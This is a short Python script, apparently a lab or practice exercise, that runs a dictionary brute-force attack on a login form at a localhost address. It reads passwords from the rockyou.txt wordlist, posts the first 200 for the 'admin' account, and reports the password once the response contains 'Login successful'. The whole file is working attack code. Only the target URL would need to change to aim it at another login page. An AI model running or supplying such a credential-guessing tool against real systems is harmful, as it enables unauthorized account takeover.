import requests

target_url = "http://127.0.0.1:5000/login"
username = "admin"  # the user we are attacking

# Read passwords from rockyou.txt
with open("rockyou.txt", "r", encoding="latin-1") as f:
    passwords = f.readlines()

print(f"Starting attack on account: {username}")
print(f"Trying {len(passwords)} passwords...")
print("-" * 40)

found = False
for i, password in enumerate(passwords[:200]):  # trying first 200 passwords
    password = password.strip()
    
    data = {
        "username": username,
        "password": password
    }
    
    response = requests.post(target_url, data=data)
    
    if "Login successful" in response.text:
        print(f"PASSWORD FOUND! Password is: {password}")
        print(f"Found after {i+1} attempts")
        found = True
        break
    else:
        print(f"Attempt {i+1}: {password} - Failed")

if not found:
    print("Password not found in first 200 attempts")